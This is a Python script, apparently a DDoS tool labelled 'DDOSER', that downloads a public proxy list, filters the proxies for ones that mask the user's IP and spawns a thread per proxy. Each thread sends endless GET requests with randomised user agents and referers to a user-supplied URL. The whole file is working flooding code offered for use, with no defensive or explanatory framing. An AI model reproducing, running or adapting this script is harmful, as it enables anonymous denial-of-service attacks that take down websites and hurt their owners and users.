#!/usr/bin/python3
import requests as r, os, threading, sys, random, re, time
from threading import Thread
from colorama import Fore,Style
from bs4 import BeautifulSoup

def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def useragent():
	global randuser
	randuser =['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36 OPR/67.0.3575.137',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.149 Safari/537.36 OPR/67.0.3575.115',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko/20100101 Firefox/75.0',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv: 74.0) Gecko/20100101 Firefox/74.0',
	'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv: 75.0) Gecko/20100101 Firefox/75.0',
	'Mozilla/5.0 (Windows NT 10.0; rv: 68.0) Gecko/20100101 Firefox/68.0',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36',
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/81.0.4044.92 Safari/537.36',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, как Gecko) Chrome/80.0.3987.163 Safari/537.36',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, как Gecko) Версия/13.1 Safari/605.1.15',
	'Mozilla/5.0 (Linux; Android 10; MAR-LX1H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2986.42 Safari/537.36']

def randomString(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def ddos(ip, prox, url, timer):
	useragent()
	try:
		ipx = r.get("http://v4.ident.me/", proxies={'http':prox, 'https':prox}, verify=False, timeout=5).text
	except:
		ipx = ip
	if ip != ipx:
		proxies={}
		proxies['http'] = prox
		proxies['https'] = prox
		colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
		color = random.choice(colors)
		headers = {
				'User-Agent': random.choice(randuser),
				'Cache-Control': 'no-cache',
				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
				'Keep-Alive': str(random.randint(110,120)),
				'Connection': 'keep-alive'
				}
		while True:
			try:
				req = r.get(url, headers=headers)
				req = r.get(url, headers=headers, proxies=proxies)
				print(color+"{}  |  {}  |  localhost".format(req.status_code, url)+Style.RESET_ALL)
				print(color+"{}  |  {}  |  {}".format(req.status_code, url, prox)+Style.RESET_ALL)
				time.sleep(timer)
			except:
				continue

clear()
print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\nDev: FSystem88 ~ [ prod. by Ca$h&Мир® ]"+Style.RESET_ALL)

ip = r.post("http://v4.ident.me/").text
proxurl = "https://api.proxyscrape.com/?request=displayproxies"
req = r.get(proxurl)
array = req.text.split()

url = input("URL: ")
timer = input("Time delay in seconds (default 1): ")
try:
	if timer == "":
		timer = 1
	else:
		timer = int(timer)
except ValueError:
	print(Fore.RED+"INCORRECT TIME DELAY"+Style.RESET_ALL)

for prox in array:
	thread_list = []
	t = threading.Thread (target=ddos, args=(ip, prox, url, timer))
	thread_list.append(t)
	t.start()
